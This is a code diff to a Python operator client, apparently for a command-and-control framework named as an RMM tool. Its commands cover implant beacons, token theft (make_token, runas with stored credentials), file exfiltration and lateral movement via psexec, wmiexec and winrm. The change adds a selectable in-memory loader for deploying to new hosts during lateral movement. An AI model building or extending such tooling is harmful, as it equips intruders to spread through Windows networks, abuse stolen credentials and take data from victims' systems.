@@ -239,11 +239,14 @@ class RmmApiClient:
         verify_timeout: float = 120,
         https: bool = False,
         insecure: bool = False,
+        loader: str = "csharp",
     ):
         if not isinstance(https, bool) or (https and method.strip().lower() != "winrm"):
             raise ValueError("https must be a boolean and is supported only for winrm")
         if not isinstance(insecure, bool) or (insecure and not https):
             raise ValueError("insecure must be a boolean and requires WinRM HTTPS")
+        if not isinstance(loader, str) or (loader or "").strip().lower() not in ("csharp", "powershell"):
+            raise ValueError("loader must be csharp or the reserved powershell value")
         return self.request(
             "POST",
             f"/api/v1/sessions/{session_id}/lateral",
@@ -254,6 +257,7 @@ class RmmApiClient:
                 "exec_timeout": exec_timeout,
                 "register_timeout": register_timeout,
                 "verify_timeout": verify_timeout,
+                "loader": (loader or "csharp").strip().lower(),
                 **({"https": True} if https else {}),
                 **({"insecure": True} if insecure else {}),
             },
@@ -1241,6 +1245,7 @@ def cmd_lateral(client: RmmApiClient, state: dict, args):
         exec_timeout=args.exec_timeout,
         register_timeout=args.register_timeout,
         verify_timeout=args.verify_timeout,
+        loader=getattr(args, "loader", "csharp"),
         **({"https": True} if getattr(args, "https", False) else {}),
         **({"insecure": True} if getattr(args, "insecure", False) else {}),
     )
@@ -1700,7 +1705,7 @@ Spawn:    /spawn [id]   (same identity; children inherit the source build mode)
           /runas -i <cred_id> <command>   (run command under different identity)
 Creds:    /creds list | /creds add <domain\\user | user> <password> | /creds del -i <cred_id> | /creds purge
 Identity: /make_token -i <cred_id> | /make_token <domain\\user | user> <password>  (runas /netonly style) | /rev2self | /uid
-Lateral:  /lateral <psexec|wmiexec|winrm> <host> [-s|--https] [-k|--insecure]   (HTTPS/5986 for winrm only; inherits source build mode)
+Lateral:  /lateral <psexec|wmiexec|winrm> <host> [-s|--https] [-k|--insecure] [-l|--loader csharp|powershell]   (HTTPS/5986 for winrm only; wmiexec/winrm deploy in memory via the csharp loader; powershell is reserved)
           -k requires -s and skips CA/name/revocation checks; certificate dates still apply.
 Files:    /download <remote> | /exfil <remote> [profile] | /upload <local> <remote> | /screenshot
 Plugins: /pe list | /pe <plugin> [export] [input]   (isolated PE load; marked DLLs use a temporary file)
@@ -2273,15 +2278,30 @@ def run_interactive(
                 continue
             if cmd == "lateral":
                 method = rest[0].lower() if rest else ""
-                flags = [arg for arg in rest[1:] if arg in ("-s", "--https")]
-                insecure_flags = [arg for arg in rest[1:] if arg in ("-k", "--insecure")]
-                targets = [arg for arg in rest[1:] if arg not in ("-s", "--https", "-k", "--insecure")]
+                loader_values = []
+                rest_args = []
+                index = 1
+                while index < len(rest):
+                    if rest[index] in ("-l", "--loader"):
+                        if index + 1 >= len(rest):
+                            loader_values = ["<missing>"]
+                            break
+                        loader_values.append(rest[index + 1])
+                        index += 2
+                        continue
+                    rest_args.append(rest[index])
+                    index += 1
+                flags = [arg for arg in rest_args if arg in ("-s", "--https")]
+                insecure_flags = [arg for arg in rest_args if arg in ("-k", "--insecure")]
+                targets = [arg for arg in rest_args if arg not in ("-s", "--https", "-k", "--insecure")]
                 if (method not in ("psexec", "wmiexec", "winrm") or
                         len(targets) != 1 or len(flags) > 1 or len(insecure_flags) > 1 or
                         (insecure_flags and not flags) or
                         any(arg.startswith("-") for arg in targets) or
-                        (flags and method != "winrm")):
-                    warn("Usage: /lateral <psexec|wmiexec|winrm> <host> [-s|--https] [-k|--insecure (requires -s)]")
+                        (flags and method != "winrm") or
+                        len(loader_values) > 1 or
+                        any(value not in ("csharp", "powershell") for value in loader_values)):
+                    warn("Usage: /lateral <psexec|wmiexec|winrm> <host> [-s|--https] [-k|--insecure (requires -s)] [-l|--loader csharp|powershell]")
                     continue
                 sid = session_or_none(state)
                 if not sid:
@@ -2289,7 +2309,11 @@ def run_interactive(
                     continue
                 host = targets[0]
                 say(f"Lateral {method} to {host} (waits for the next beacon)...")
-                code, data = client.lateral_move(sid, method, host, **({"https": True} if flags else {}), **({"insecure": True} if insecure_flags else {}))
+                code, data = client.lateral_move(
+                    sid, method, host,
+                    **({"loader": loader_values[0]} if loader_values else {}),
+                    **({"https": True} if flags else {}),
+                    **({"insecure": True} if insecure_flags else {}))
                 if code != 200:
                     detail = data.get("error") if isinstance(data, dict) else data
                     warn(f"lateral failed ({code})" + (f": {detail}" if detail else ""))
@@ -2949,6 +2973,8 @@ def build_parser() -> argparse.ArgumentParser:
     sp_lat.add_argument("--session", default=None, help="Source session ID")
     sp_lat.add_argument("-s", "--https", action="store_true", help="Use HTTPS/5986 with certificate validation (winrm only)")
     sp_lat.add_argument("-k", "--insecure", action="store_true", help="Skip CA/name/revocation checks; certificate dates still apply (requires --https)")
+    sp_lat.add_argument("-l", "--loader", choices=("csharp", "powershell"), default="csharp",
+                        help="Loader implementation for the wmiexec/winrm in-memory deployment; powershell is reserved and fails explicitly")
     sp_lat.add_argument("--no-verify", action="store_true", help="Skip checks and report an unconfirmed request, not deployment success")
     sp_lat.add_argument("--exec-timeout", type=float, default=300, help="Seconds to wait for the lateral execution result")
     sp_lat.add_argument("--register-timeout", type=float, default=60, help="Seconds to wait for the target session to register")
